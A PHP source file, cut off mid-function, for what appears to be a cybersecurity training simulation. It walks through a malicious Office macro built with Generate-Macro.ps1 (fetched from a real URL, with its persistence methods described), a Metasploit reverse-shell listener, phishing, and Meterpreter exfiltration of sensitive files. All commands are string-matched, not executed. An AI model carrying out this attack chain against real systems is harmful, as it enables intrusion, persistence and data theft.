<?php
declare(strict_types=1);

require_once __DIR__ . '/../includes/bootstrap.php';

require_login();

const CONSOLE_STATE_KEY = 'mission_console';
const PAYLOAD_CONSOLE_KEY = 'payload_console';
const METERPRETER_STATE_KEY = 'meterpreter_console';
const PAYLOAD_REQUIRED_IP = '35.233.136.83';
const PAYLOAD_IWR_URI = 'https://raw.githubusercontent.com/enigma0x3/Generate-Macro/refs/heads/master/Generate-Macro.ps1';
const LISTENER_STATE_KEY = 'listener_console';
const LISTENER_SHELL_PROMPT = '└─$ ';
const LISTENER_SHELL_HEADER = '┌──(kali㉿kali)-[~/Downloads/Generate-Macro]';
const LISTENER_MSF_PROMPT = 'msf > ';
const LISTENER_MSF_EXPLOIT_PROMPT = 'msf exploit(multi/handler) > ';
const METERPRETER_SENSITIVE_FILES = [
    'Sensitive-Financials.xlsx',
    'CEO-Briefing.docx',
];

function normalize_terminal_output(string $text): string
{
    $text = str_replace("\r\n", "\n", $text);
    $text = str_replace("\r", "\n", $text);
    return str_replace("\n", "\r\n", $text);
}

function payload_macro_template(): array
{
    return [
        'active' => false,
        'step' => null,
        'inputs' => [
            'ip' => null,
            'port' => null,
            'doc' => null,
            'attack' => null,
            'payload' => null,
        ],
    ];
}

function payload_macro_source(): string
{
    return <<<'MACRO'
#Coded by Matt Nelson (@enigma0x3)
<#
.SYNOPSIS
Standalone Powershell script that will generate a malicious Microsoft Office document with a specified payload and persistence method

.DESCRIPTION
This script will generate malicious Microsoft Excel Documents that contain VBA macros. This script will prompt you for your attacking IP 
(the one you will receive your shell at), the port you want your shell at, and the name of the document. From there, the script will then
display a menu of different attacks, all with different persistence methods. Once an attack is chosen, it will then prompt you for your payload type
(Only HTTP and HTTPS are supported).

When naming the document, don't include a file extension.

These attacks use Invoke-Shellcode, which was created by Matt Graeber. Follow him on Twitter --> @mattifestation

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None


.Attack Types
Meterpreter Shell with Logon Persistence: This attack delivers a meterpreter shell and then persists in the registry 
by creating a hidden .vbs file in C:\Users\Public and then creates a registry key in HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
that executes the .vbs file on login.

Meterpreter Shell with Powershell Profile Persistence: This attack requires the target user to have admin right but is quite creative. It will
deliver you a shell and then drop a malicious .vbs file in C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs. Once dropped, it creates
an infected Powershell Profile file in C:\Windows\SysNative\WindowsPowerShell\v1.0\ and then creates a registry key in 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load that executes Powershell.exe on startup. Since the Powershell profile loads automatically when 
Powershell.exe is invoked, your code is executed automatically.

Meterpreter Shell with Alternate Data Stream Persistence: This attack will give you a shell and then persists my creating 2 alternate data streams attached to the AppData
folder. It then creates a registry key that parses the Alternate Data Streams and runs the Base64 encoded payload.

Meterpreter Shell with Scheduled Task Persistence: This attack will give you a shell and then persist by creating a scheduled task with the action set to
the set payload. 


.EXAMPLE
PS> ./Generate-Macro.ps1
Enter IP Address: 10.0.0.10
Enter Port Number: 1111
Enter the name of the document (Do not include a file extension): FinancialData

--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
3. Meterpreter Shell with Alternate Data Stream Persistence
4. Meterpreter Shell with Scheduled Task Persistence
------------------------------
Select Attack Number & Press Enter: 1

--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------
Select Payload Number & Press Enter: 1
Saved to file C:\Users\Malware\Desktop\FinancialData.xls
PS>
MACRO;
}

function payload_prompt_for_step(?string $step): ?string
{
    return match ($step) {
        'ip' => 'Enter IP Address: ',
        'port' => 'Enter Port Number: ',
        'doc' => 'Enter the name of the document (Do not include a file extension): ',
        'attack' => 'Select Attack Number & Press Enter: ',
        'payload' => 'Select Payload Number & Press Enter: ',
        default => null,
    };
}

function console_default_state(): array
{
    return [
        'cwd' => '/',
        'missions_unlocked' => 0,
        'intel_flag' => false,
    ];
}

function console_state(): array
{
    if (!isset($_SESSION[CONSOLE_STATE_KEY])) {
        $_SESSION[CONSOLE_STATE_KEY] = console_default_state();
    }

    return $_SESSION[CONSOLE_STATE_KEY];
}

function console_save_state(array $state): void
{
    $_SESSION[CONSOLE_STATE_KEY] = $state;
}

function console_reset(): array
{
    $state = console_default_state();
    console_save_state($state);
    return $state;
}

function payload_default_state(): array
{
    return [
        'cwd' => 'C:\\Users\\Deep\\Desktop',
        'files' => ['Readme.txt'],
        'downloaded' => false,
        'download_name' => null,
        'macro' => payload_macro_template(),
        'trojan' => null,
        'complete' => false,
        'phish' => [
            'sent' => false,
            'to' => null,
            'subject' => null,
            'body' => null,
            'attachment' => null,
            'timestamp' => null,
            'call_sent' => false,
            'call_timestamp' => null,
            'call_script' => null,
            'call_voicemail' => null,
        ],
    ];
}

function meterpreter_default_state(): array
{
    return [
        'active' => false,
        'history' => [],
        'cwd' => 'C:\\Users\\jdoe\\Desktop',
        'files' => [
            'Desktop.ini' => ['type' => 'fil', 'size' => 282, 'meta' => '100644/rw-r--r--', 'modified' => '2025-11-18 07:22:10 -0800'],
            'Quarterly-Forecast.xlsx' => ['type' => 'fil', 'size' => 845312, 'meta' => '100660/rw-rw----', 'modified' => '2025-11-25 08:14:02 -0800'],
            'Invoices' => ['type' => 'dir', 'size' => 0, 'meta' => '040775/rwxrwxr-x', 'modified' => '2025-11-24 17:48:55 -0800'],
            'Sensitive-Financials.xlsx' => ['type' => 'fil', 'size' => 512480, 'meta' => '100600/rw-------', 'modified' => '2025-11-25 09:32:41 -0800'],
            'Vendor-Contracts' => ['type' => 'dir', 'size' => 0, 'meta' => '040755/rwxr-xr-x', 'modified' => '2025-11-19 13:07:18 -0800'],
            'CEO-Briefing.docx' => ['type' => 'fil', 'size' => 129024, 'meta' => '100660/rw-rw----', 'modified' => '2025-11-21 11:02:33 -0800'],
        ],
    ];
}

function meterpreter_state(): array
{
    if (!isset($_SESSION[METERPRETER_STATE_KEY])) {
        $_SESSION[METERPRETER_STATE_KEY] = meterpreter_default_state();
    }
    return $_SESSION[METERPRETER_STATE_KEY];
}

function meterpreter_save_state(array $state): void
{
    $_SESSION[METERPRETER_STATE_KEY] = $state;
}

function simulation_task_state(array $progress, string $taskKey): string
{
    return simulation_progress_is_task_complete($progress, $taskKey) ? 'completed' : 'pending';
}

function simulation_task_status_text(array $progress, string $taskKey): string
{
    return simulation_progress_is_task_complete($progress, $taskKey) ? 'Completed' : 'Pending';
}

function payload_available_attachments(array $state): array
{
    $files = $state['files'] ?? [];
    if (!empty($state['download_name'])) {
        $files[] = $state['download_name'];
    }
    if (!empty($state['trojan'])) {
        $files[] = $state['trojan'];
    }

    $files = array_filter($files, static fn ($name) => is_string($name) && trim($name) !== '');

    return array_values(array_unique($files));
}

function payload_state(): array
{
    if (!isset($_SESSION[PAYLOAD_CONSOLE_KEY])) {
        $_SESSION[PAYLOAD_CONSOLE_KEY] = payload_default_state();
    }

    return $_SESSION[PAYLOAD_CONSOLE_KEY];
}

function payload_save_state(array $state): void
{
    $_SESSION[PAYLOAD_CONSOLE_KEY] = $state;
}

function payload_reset(): array
{
    $state = payload_default_state();
    payload_save_state($state);
    return $state;
}

function listener_default_state(): array
{
    return [
        'msf_active' => false,
        'msf_context' => 'shell',
        'lhost' => '',
        'lport' => '4444',
        'handler_waiting' => false,
        'bind_host' => null,
    ];
}

function listener_state(): array
{
    if (!isset($_SESSION[LISTENER_STATE_KEY]) || !is_array($_SESSION[LISTENER_STATE_KEY])) {
        $_SESSION[LISTENER_STATE_KEY] = listener_default_state();
    }

    return $_SESSION[LISTENER_STATE_KEY];
}

function listener_save_state(array $state): void
{
    $_SESSION[LISTENER_STATE_KEY] = $state;
}

function listener_reset(): array
{
    $state = listener_default_state();
    listener_save_state($state);
    return $state;
}

function listener_shell_error(string $command): string
{
    $token = trim(strtok($command, " \t")) ?: trim($command);
    if ($token === '') {
        $token = 'command';
    }
    return "{$token}: command not found";
}

function listener_is_msf_command(string $command): bool
{
    $trimmed = trim($command);
    if ($trimmed === '') {
        return false;
    }

    $lower = strtolower($trimmed);
    $directMatches = [
        'use',
        'options',
        'info',
        'info -d',
        'run',
        'exploit',
        'help',
        'exit',
    ];

    foreach ($directMatches as $match) {
        if ($lower === $match) {
            return true;
        }
    }

    $prefixMatches = [
        'use ',
        'set ',
        'info ',
    ];

    foreach ($prefixMatches as $prefix) {
        if (str_starts_with($lower, $prefix)) {
            return true;
        }
    }

    return false;
}

function listener_current_prompt(array $state): string
{
    if (!($state['msf_active'] ?? false)) {
        return LISTENER_SHELL_PROMPT;
    }

    return ($state['msf_context'] ?? 'root') === 'exploit'
        ? LISTENER_MSF_EXPLOIT_PROMPT
        : LISTENER_MSF_PROMPT;
}

function listener_info_text(): string
{
    return <<<'INFO'
       Name: Generic Payload Handler
     Module: exploit/multi/handler
   Platform: Android, Apple_iOS, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi
       Arch: x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r, riscv32be, riscv32le, riscv64be, riscv64le, loongarch64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Manual

Provided by:
  hdm <x@hdm.io>
  bcook-r7

Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Wildcard Target

Check supported:
  No

Payload information:
  Space: 10000000
  Avoid: 0 characters

Description:
  This module is a stub that provides all of the
  features of the Metasploit payload system to exploits
  that have been launched outside of the framework.

View the full module info with the info -d command.
INFO;
}

function listener_option_column(string $value, int $width = 15): string
{
    if ($value === '') {
        return str_repeat(' ', $width);
    }

    return str_pad($value, $width, ' ', STR_PAD_RIGHT);
}

function listener_options_text(array $state): string
{
    $host = listener_option_column($state['lhost'] ?? '');
    $port = listener_option_column($state['lport'] ?? '4444');

    return <<<OPTS
                                                                                   
Payload options (generic/shell_reverse_tcp):                                       
                                                                                   
   Name   Current Setting  Required  Description                                   
   ----   ---------------  --------  -----------                                   
   LHOST  {$host}  yes       The listen address (an interface may be spec  
                                     ified)                                       
   LPORT  {$port}  yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.
OPTS;
}

function handle_console_command(string $command, array $state): array
{
    $command = trim($command);
    $output = '';
    $clear = false;

    if ($command === '') {
        return ['state' => $state, 'output' => '', 'clear' => false];
    }

    $rootFiles = [
        'README.txt',
        'intel',
        'logs',
    ];

    $intelFiles = [
        'ops_report.txt',
        'payload.bin',
    ];

    $logFiles = [
        'beacon.log',
        'system.log',
    ];

    switch (true) {
        case $command === 'help':
            $output = "Available commands:
  help              Show this list
  ls / pwd          Inspect the simulated filesystem
  cd <dir>          Move between intel/ logs
  cat <file>        Read the contents of a file
  hint              Receive guidance from HQ
  reset             Restore the sandbox state
  clear             Wipe the terminal output";
            break;
        case $command === 'clear':
            $clear = true;
            $output = "Screen cleared.";
            break;
        case $command === 'reset':
            $state = console_reset();
            $output = "Sandbox reset. Starting from /";
            break;
        case $command === 'pwd':
            $output = $state['cwd'];
            break;
        case $command === 'ls':
            if ($state['cwd'] === '/') {
                $output = implode("\n", $rootFiles);
            } elseif ($state['cwd'] === '/intel') {
                $output = implode("\n", $intelFiles);
            } elseif ($state['cwd'] === '/logs') {
                $output = implode("\n", $logFiles);
            }
            break;
        case str_starts_with($command, 'cd'):
            $parts = preg_split('/\s+/', $command);
            $target = $parts[1] ?? '';
            if ($target === '' || $target === '/') {
                $state['cwd'] = '/';
                $output = 'Navigated to /';
            } elseif ($target === '..') {
                $state['cwd'] = '/';
                $output = 'Navigated to /';
            } elseif ($target === 'intel' || $target === '/intel') {
                $state['cwd'] = '/intel';
                $output = 'Navigated to /intel';
            } elseif ($target === 'logs' || $target === '/logs') {
                $state['cwd'] = '/logs';
                $output = 'Navigated to /logs';
            } else {
                $output = "cd: {$target}: No such directory";
            }
            break;
        case str_starts_with($command, 'cat'):
            $parts = preg_split('/\s+/', $command, 2);
            $file = $parts[1] ?? '';
            if ($file === '') {
                $output = 'Usage: cat <file>';
                break;
            }

            if ($state['cwd'] === '/' && strcasecmp($file, 'README.txt') === 0) {
                $output = ">>> NODE BRIEFING

Intercepted host is seeded with synthetic artifacts. Sweep directories intel/ and logs/ to find the signal phrase.";
            } elseif ($state['cwd'] === '/intel' && strcasecmp($file, 'ops_report.txt') === 0) {
                $output = "Field Team: Voice clone surfaced on executive bridge call.
Countermeasure: Deploy passphrase 'aurora vector' only after verifying multi-channel metadata.";
            } elseif ($state['cwd'] === '/intel' && strcasecmp($file, 'payload.bin') === 0) {
                $output = base64_encode('This is a harmless mock payload used for the exercise.');
            } elseif ($state['cwd'] === '/logs' && strcasecmp($file, 'beacon.log') === 0) {
                $state['intel_flag'] = true;
                $output = "[00:01] inbound-signal -> KEYWORD: AURORA VECTOR
[00:02] anomaly detected: request wire transfer
[00:03] action: escalate to human verification

## Mission Complete: You have identified the safeguard phrase.";
            } elseif ($state['cwd'] === '/logs' && strcasecmp($file, 'system.log') === 0) {
                $output = "systemd[1]: Starting synthetic comms recorder...
detector: probability of spoofed inflection spikes at 0.91";
            } else {
                $output = "cat: {$file}: No such file in {$state['cwd']}";
            }
            break;
        case $command === 'hint':
            if ($state['cwd'] === '/') {
                $output = 'Hint: pivot into intel/ first, then inspect logs/';
            } elseif ($state['cwd'] === '/intel') {
                $output = 'Hint: Copy the phrase from ops_report.txt and look for a confirmation inside logs/';
            } else {
                $output = 'Hint: Search for beacon activity. Anything referencing the keyword is valuable.';
            }
            break;
        default:
            $output = "bash: {$command}: command not found";
            break;
    }

    return ['state' => $state, 'output' => normalize_terminal_output($output), 'clear' => $clear];
}

function payload_handle_command(string $command, array $state): array
{
    $command = trim($command);
    $output = '';
    $clear = false;

    if ($command === '__CTRL_C__') {
        $state['macro'] = payload_macro_template();
        $output = '^C';
        return [
            'state' => $state,
            'output' => normalize_terminal_output($output),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => null,
            'awaiting_prompt' => false,
        ];
    }

    if ($state['macro']['active']) {
        return payload_handle_macro_input($command, $state);
    }

    if ($command === '') {
        return ['state' => $state, 'output' => '', 'clear' => false];
    }

    $promptText = null;

    switch (true) {
        case strcasecmp($command, 'help') === 0:
            $output = "Available commands:
  help                   Show this list
  ls / pwd               Inspect working directory
  Invoke-RestMethod      Retrieve the public IPv4
  Invoke-WebRequest      Download Generate-Macro.ps1
  .\\Generate-Macro.ps1  Launch the macro builder
  reset                  Restore the lab state
  clear | cls            Clear the screen";
            break;
        case in_array(strtolower($command), ['clear', 'cls'], true):
            $clear = true;
            $output = 'Screen cleared.';
            break;
        case strcasecmp($command, 'reset') === 0:
            $state = payload_reset();
            $output = 'Payload lab reset. Working directory restored.';
            break;
        case strcasecmp($command, 'pwd') === 0:
            $output = $state['cwd'];
            break;
        case preg_match('/^ls\b/i', $command) === 1:
            $files = $state['files'];
            $downloadName = $state['download_name'] ?? null;
            if ($state['downloaded'] && $downloadName && !in_array($downloadName, $files, true)) {
                $files[] = $downloadName;
            }
            if ($state['trojan']) {
                $files[] = $state['trojan'];
            }
            $files = array_values(array_unique($files));
            $state['files'] = $files;
            $output = implode("\n", $files);
            break;
        case preg_match('/^Invoke-RestMethod\s+-Uri\s+("?)(http:\/\/ipinfo\.io\/ip)\1$/i', $command) === 1:
            $output = PAYLOAD_REQUIRED_IP;
            break;
        case stripos($command, 'Invoke-WebRequest') === 0:
            $uriMatch = [];
            if (!preg_match('/-Uri\s+("?)([^"\s]+)\1/i', $command, $uriMatch)) {
                $output = 'Specify the source URI (example: -Uri ' . PAYLOAD_IWR_URI . ').';
                break;
            }
            if (strcasecmp($uriMatch[2], PAYLOAD_IWR_URI) !== 0) {
                $output = 'URI mismatch. Use ' . PAYLOAD_IWR_URI . ' to pull the approved builder.';
                break;
            }
            $outMatch = [];
            if (!preg_match('/-OutFile\s+("?)([^"\s]+)\1/i', $command, $outMatch)) {
                $output = 'Specify the output file (example: -OutFile .\Generate-Macro.ps1).';
                break;
            }
            $fileName = trim($outMatch[2]);
            $fileName = trim($fileName, '"\'');
            if (str_starts_with($fileName, '.\\') || str_starts_with($fileName, './')) {
                $fileName = substr($fileName, 2);
            }
            if ($fileName === '') {
                $fileName = 'Generate-Macro.ps1';
            }
            $state['downloaded'] = true;
            $state['download_name'] = $fileName;
            if (!in_array($fileName, $state['files'], true)) {
                $state['files'][] = $fileName;
            }
            $output = "{$state['cwd']}\\{$fileName} downloaded successfully.";
            break;
        case preg_match('/^\.\\\s*(.+)$/', $command, $invokeMatch) === 1:
            $scriptName = $state['download_name'] ?? 'Generate-Macro.ps1';
            $invoked = trim($invokeMatch[1], '"\'');
            if (!$state['downloaded']) {
                $output = 'Generate-Macro.ps1 is missing. Use Invoke-WebRequest to pull it down first.';
                break;
            }
            if ($invoked === '' || strcasecmp($invoked, $scriptName) !== 0) {
                $output = "File '{$invoked}' not found. Execute .\\{$scriptName}";
                break;
            }
            $state['macro'] = payload_macro_template();
            $state['macro']['active'] = true;
            $state['macro']['step'] = 'ip';
            $promptText = payload_prompt_for_step('ip');
            $output = '';
            break;
        case preg_match('/^(?:type|get-content|gc)\s+(.+)/i', $command, $typeMatch) === 1:
            $target = trim($typeMatch[1]);
            $target = trim($target, '"\'');
            if ($target === '') {
                $output = 'type : Cannot bind argument.';
                break;
            }
            $normalizedTarget = $target;
            if (str_starts_with(strtolower($normalizedTarget), '.\\')) {
                $normalizedTarget = substr($normalizedTarget, 2);
            }
            $files = array_values(array_unique(array_merge(
                $state['files'],
                array_filter([$state['download_name'] ?? null, $state['trojan'] ?? null])
            )));
            $state['files'] = $files;
            if (strcasecmp($normalizedTarget, 'Readme.txt') === 0) {
                $output = "Recon Checklist:\n - Confirm IP via Invoke-RestMethod -Uri http://ipinfo.io/ip\n - Pull Generate-Macro.ps1\n - Run the builder.\n";
            } elseif ($state['downloaded'] && strcasecmp($normalizedTarget, ($state['download_name'] ?? 'Generate-Macro.ps1')) === 0) {
                $output = payload_macro_source();
            } elseif ($state['trojan'] && strcasecmp($normalizedTarget, $state['trojan']) === 0) {
                $output = "Binary contents of {$state['trojan']} are not viewable in this lab.";
            } else {
                $output = "type : Cannot find path '{$target}' because it does not exist.";
            }
            break;
        default:
            $output = "PS: '{$command}' is not recognized within this lab.";
            break;
    }

    return [
        'state' => $state,
        'output' => normalize_terminal_output($output),
        'clear' => $clear,
        'prompt_again' => false,
        'prompt_text' => $promptText,
        'awaiting_prompt' => $state['macro']['active'],
    ];
}

function payload_handle_macro_input(string $command, array $state): array
{
    $step = $state['macro']['step'];
    $output = '';
    $promptAgain = false;
    $promptText = null;

    switch ($step) {
        case 'ip':
            if ($command !== PAYLOAD_REQUIRED_IP) {
                $output = "Invalid IP. Run Invoke-RestMethod -Uri http://ipinfo.io/ip and enter {$state['cwd']} host address:";
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['ip'] = $command;
            $state['macro']['step'] = 'port';
            $promptText = payload_prompt_for_step('port');
            $output = '';
            break;
        case 'port':
            if (!preg_match('/^\d{1,5}$/', $command)) {
                $output = 'Port must be numeric. Enter Port Number:';
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['port'] = $command;
            $state['macro']['step'] = 'doc';
            $promptText = payload_prompt_for_step('doc');
            $output = '';
            break;
        case 'doc':
            if ($command === '') {
                $output = 'Document name cannot be empty. Enter the name of the document (without extension):';
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['doc'] = $command;
            $state['macro']['step'] = 'attack';
            $output = "--------Select Attack---------\n1. Meterpreter Shell with Logon Persistence\n2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)\n3. Meterpreter Shell with Alternate Data Stream Persistence\n4. Meterpreter Shell with Scheduled Task Persistence\n------------------------------";
            $promptText = 'Select Attack Number & Press Enter: ';
            break;
        case 'attack':
            if (!in_array($command, ['1', '2', '3', '4'], true)) {
                $output = 'Select a valid attack option (1-4) and press Enter:';
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['attack'] = $command;
            $state['macro']['step'] = 'payload';
            $output = "--------Select Payload---------\n1. Meterpreter Reverse HTTPS\n2. Meterpreter Reverse HTTP\n------------------------------";
            $promptText = 'Select Payload Number & Press Enter: ';
            break;
        case 'payload':
            if (!in_array($command, ['1', '2'], true)) {
                $output = 'Select a valid payload option (1-2) and press Enter:';
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['payload'] = $command;
            $doc = $state['macro']['inputs']['doc'];
            $filename = $doc . '.xls';
            $state['trojan'] = $filename;
            $state['macro'] = payload_macro_template();
            $state['complete'] = true;
            simulation_progress_mark_for_current_user('payload_prepared');
            if (!in_array($filename, $state['files'], true)) {
                $state['files'][] = $filename;
            }
            $output = "Saved to file {$state['cwd']}\\{$filename}";
            break;
        default:
            $state['macro'] = payload_macro_template();
            $output = 'Macro builder aborted.';
            break;
    }

    return [
        'state' => $state,
        'output' => $output === '' ? '' : normalize_terminal_output($output),
        'clear' => false,
        'prompt_again' => $promptAgain,
        'prompt_text' => $promptText,
        'awaiting_prompt' => $state['macro']['active'],
    ];
}

function listener_handle_command(string $command, array $state): array
{
    $command = trim($command);
    $output = '';
    $clear = false;
    $awaitingPrompt = $state['handler_waiting'] ?? false;
    $promptText = $awaitingPrompt ? '' : listener_current_prompt($state);

    if ($command === '__CTRL_C__') {
        if ($state['handler_waiting'] ?? false) {
            $state['handler_waiting'] = false;
            $output = "^C[-] Exploit failed [user-interrupt]: Interrupt\n[-] run: Interrupted";
        } else {
            $output = '^C';
        }

        return [
            'state' => $state,
            'output' => normalize_terminal_output($output),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => listener_current_prompt($state),
            'awaiting_prompt' => false,
        ];
    }

    if ($command === '') {
        return [
            'state' => $state,
            'output' => '',
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => $awaitingPrompt ? '' : listener_current_prompt($state),
            'awaiting_prompt' => $awaitingPrompt,
        ];
    }

    $isMsfCommand = listener_is_msf_command($command);

    if (!($state['msf_active'] ?? false) && $isMsfCommand) {
        return [
            'state' => $state,
            'output' => normalize_terminal_output(listener_shell_error($command)),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => LISTENER_SHELL_PROMPT,
            'awaiting_prompt' => false,
        ];
    }

    if (!($state['msf_active'] ?? false)) {
        switch (true) {
            case in_array(strtolower($command), ['clear', 'cls'], true):
                $clear = true;
                $output = 'Screen cleared.';
                break;
            case strcasecmp($command, 'reset') === 0:
                $state = listener_reset();
                $output = 'Listener lab reset.';
                break;
            case strcasecmp($command, 'msfconsole') === 0:
                $state['msf_active'] = true;
                $state['msf_context'] = 'root';
                $state['handler_waiting'] = false;
                $promptText = LISTENER_MSF_PROMPT;
                break;
            default:
                $output = listener_shell_error($command);
                break;
        }

        return [
            'state' => $state,
            'output' => normalize_terminal_output($output),
            'clear' => $clear,
            'prompt_again' => false,
            'prompt_text' => $state['msf_active'] ? LISTENER_MSF_PROMPT : LISTENER_SHELL_PROMPT,
            'awaiting_prompt' => false,
        ];
    }

    if ($state['handler_waiting'] ?? false) {
        return [
            'state' => $state,
            'output' => normalize_terminal_output('Handler is waiting for a session. Press Ctrl+C to stop.'),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => '',
            'awaiting_prompt' => true,
        ];
    }

    $lower = strtolower($command);
    $moduleRequired = fn () => ($state['msf_context'] ?? 'root') === 'exploit';
    switch (true) {
        case $lower === 'help':
            $output = "Core commands:\n  use exploit/multi/handler\n  info\n  options\n  set LHOST <ip>\n  set LPORT <port>\n  run | exploit\n  exit";
            break;
        case $lower === 'details':
            $output = '[-] Unknown command: details. Run the help command for more details.';
            break;
        case $lower === 'info':
        case $lower === 'info -d':
            $output = listener_info_text();
            break;
        case $lower === 'options':
            if (!$moduleRequired()) {
                $output = "[-] Select a module first with: use exploit/multi/handler";
                break;
            }
            $output = listener_options_text($state);
            break;
        case $lower === 'use exploit/multi/handler':
            $state['msf_context'] = 'exploit';
            $output = '[*] Using configured payload generic/shell_reverse_tcp';
            $promptText = LISTENER_MSF_EXPLOIT_PROMPT;
            break;
        case preg_match('/^set\s+(lhost|lport)\s+(.+)$/i', $command, $matches) === 1:
            if (!$moduleRequired()) {
                $output = "[-] Select a module first with: use exploit/multi/handler";
                break;
            }
            $param = strtoupper($matches[1]);
            $value = trim($matches[2]);
            if ($param === 'LPORT' && !preg_match('/^\d{1,5}$/', $value)) {
                $output = 'LPORT must be numeric.';
                break;
            }
            if ($param === 'LHOST' && $value === '') {
                $output = 'LHOST cannot be empty.';
                break;
            }
            if ($param === 'LHOST') {
                $state['lhost'] = $value;
            } else {
                $state['lport'] = $value;
            }
            $output = "{$param} => {$value}";
            break;
        case in_array($lower, ['run', 'exploit'], true):
            if (!$moduleRequired()) {
                $output = "[-] Select a module first with: use exploit/multi/handler";
                break;
            }
            $result = listener_start_handler($state);
            return $result;
        case $lower === 'exit':
            $state['msf_active'] = false;
            $state['msf_context'] = 'shell';
            $state['handler_waiting'] = false;
            $output = '[*] Exiting msfconsole.';
            $promptText = LISTENER_SHELL_PROMPT;
            break;
        default:
            $output = "[-] Unknown command: {$command}. Run the help command for more details.";
            break;
    }

    return [
        'state' => $state,
        'output' => normalize_terminal_output($output),
        'clear' => $clear,
        'prompt_again' => false,
        'prompt_text' => $promptText,
        'awaiting_prompt' => false,
    ];
}

function listener_start_handler(array $state): array
{
    if (($state['lhost'] ?? '') === '' || ($state['lport'] ?? '') === '') {
        return [
            'state' => $state,
            'output' => normalize_terminal_output('[-] You must set LHOST and LPORT before starting the listener.'),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => listener_current_prompt($state),
            'awaiting_prompt' => false,
        ];
    }

    $lines = [];
    if (($state['lhost'] ?? '') === PAYLOAD_REQUIRED_IP) {
        $lines[] = "[-] Handler failed to bind to {$state['lhost']}:{$state['lport']}: -  -";
        $state['bind_host'] = '0.0.0.0';
    } else {
        $state['bind_host'] = $state['lhost'];
    }
    $bind = $state['bind_host'] ?: '0.0.0.0';
    $lines[] = "[*] Started reverse TCP handler on {$bind}:{$state['lport']} ";
    $state['handler_waiting'] = true;
    simulation_progress_mark_for_current_user('listener_started');

    return [
        'state' => $state,
        'output' => normalize_terminal_output(implode("\n", $lines)),
        'clear' => false,
        'prompt_again' => false,
        'prompt_text' => '',
        'awaiting_prompt' => true,
    ];
}

function meterpreter_handle_command(string $command, array $state, array $phishState): array
{
    $command = trim($command);
    $output = '';
    $clear = false;

    if (!($phishState['sent'] ?? false) || !($phishState['call_sent'] ?? false)) {
        return [
            'state' => $state,
            'output' => "Waiting for the target to open the workbook. Send the phishing email and voicemail first.",
            'clear' => false,
        ];
    }

    if (!$state['active']) {
        $state['active'] = true;
        $output = "[*] Sending stage (24772 bytes) to 127.0.0.1\r\n"
            . "[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:36552) at "
            . date('Y-m-d H:i:s T') . "\r\n"
            . "[*] Starting interaction with 1...\r\n";
        if ($command === '') {
            return [
                'state' => $state,
                'output' => $output,
                'clear' => false,
            ];
        }
    }

    if ($command === '') {
        return [
            'state' => $state,
            'output' => '',
            'clear' => false,
        ];
    }

    switch (true) {
        case $command === 'help':
            $output = "Core commands:\r\n  getuid\r\n  ls\r\n  pwd\r\n  download <file>\r\n  clear";
            break;
        case $command === 'clear':
        case $command === 'cls':
            $clear = true;
            $output = 'Screen cleared.';
            break;
        case $command === 'getuid':
            $output = 'Server username: jdoe';
            break;
        case $command === 'pwd':
            $output = $state['cwd'];
            break;
        case $command === 'ls':
            $lines = [
                "Listing: {$state['cwd']}",
                str_repeat('=', 44),
                '',
                "Mode              Size   Type  Last modified              Name",
                "----              ----   ----  -------------              ----",
            ];
            foreach ($state['files'] as $name => $info) {
                $lines[] = sprintf(
                    '%-16s %-6s %-5s %-26s %s',
                    $info['meta'],
                    number_format($info['size']),
                    $info['type'],
                    $info['modified'],
                    $name
                );
            }
            $output = implode("\r\n", $lines);
            break;
        case preg_match('/^download\s+(.+)/i', $command, $m) === 1:
            $file = trim($m[1], '"\'');
            if ($file === '') {
                $output = 'Usage: download <filename>';
                break;
            }
            if (!array_key_exists($file, $state['files'])) {
                $output = "[-] File {$file} not found on target.";
                break;
            }
            $targetPath = "/home/kali/tmp/{$file}";
            $output = "[*] Downloading: {$file} -> {$targetPath}\r\n"
                . "[*] Downloaded 3.33 KiB of 3.33 KiB (100.0%): {$file} -> {$targetPath}\r\n"
                . "[*] Completed  : {$file} -> {$targetPath}";
            if (in_array($file, METERPRETER_SENSITIVE_FILES, true)) {
                simulation_progress_mark_for_current_user('shell_caught');
            }
            break;
        default:
            $output = "meterpreter: Unknown command '{$command}'.";
            break;
    }

    return [
        'state' => $state,
        'output' => $output,
        'clear' => $clear,
    ];
}

function phish_handle_submission(array $input, array $state): array
{
    $to = trim($input['to'] ?? '');
    $subject = trim($input['subject'] ?? '');
    $body = trim($input['body'] ?? '');
    $attachment = trim($input['attachment'] ?? '');
    $availableAttachments = payload_available_attachments($state);
    $errors = [];

